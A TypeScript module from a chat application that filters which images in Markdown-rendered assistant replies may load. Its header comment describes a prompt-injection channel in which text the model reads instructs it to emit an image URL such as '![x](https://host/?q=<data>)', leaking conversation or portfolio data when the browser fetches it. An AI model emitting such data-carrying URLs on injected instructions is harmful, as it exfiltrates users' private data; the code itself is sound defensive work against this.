// Which images in model output may be loaded.
//
// Assistant replies are rendered as Markdown. If a reply contains ![x](https://host/?q=<data>),
// the browser fetches that URL as soon as the message is drawn, without any click. Text the model
// read (a news article, a pasted document, an image) can instruct it to produce such a URL, which
// turns an image into a channel for sending conversation or portfolio data to a third party.
//
// So an image is loaded only when it cannot leave this application:
//   - a path under /api/ on this origin (stored chat images live at /api/chat/conversation-images/),
//   - a data:image/... URL (the bytes are already in the page).
// Any other image is shown as a link that loads nothing until the user decides to click it,
// or as plain text when it is not an http(s) URL.

export type ImageDecision =
  | { kind: 'image'; src: string }
  | { kind: 'link'; href: string }
  | { kind: 'text' }

const DATA_IMAGE = /^data:image\/[a-z0-9.+-]+[;,]/i
const HTTP_URL = /^https?:\/\/[^\s/?#]/i

// Whitespace and control characters are stripped or reinterpreted by URL parsers, and browsers
// read "\" as "/" — so "/api/..\\..//host" style tricks are refused outright.
function hasUnsafeCharacters(value: string): boolean {
  for (let index = 0; index < value.length; index += 1) {
    const code = value.charCodeAt(index)
    if (code <= 0x20 || code === 0x7f || code === 0x5c) return true
  }
  return false
}

function isSameOriginApiPath(src: string): boolean {
  if (!src.startsWith('/api/') || hasUnsafeCharacters(src)) return false
  // No way out of /api/ by path traversal (also in percent-encoded form).
  const path = src.split(/[?#]/, 1)[0]
  return !path.split('/').some((segment) => /^(\.|%2e){2}$/i.test(segment))
}

export function isTrustedImageSrc(src: unknown): src is string {
  if (typeof src !== 'string' || src === '') return false
  return isSameOriginApiPath(src) || DATA_IMAGE.test(src)
}

export function classifyImageSrc(src: unknown): ImageDecision {
  if (isTrustedImageSrc(src)) return { kind: 'image', src }
  if (typeof src === 'string' && HTTP_URL.test(src) && !hasUnsafeCharacters(src)) return { kind: 'link', href: src }
  return { kind: 'text' }
}
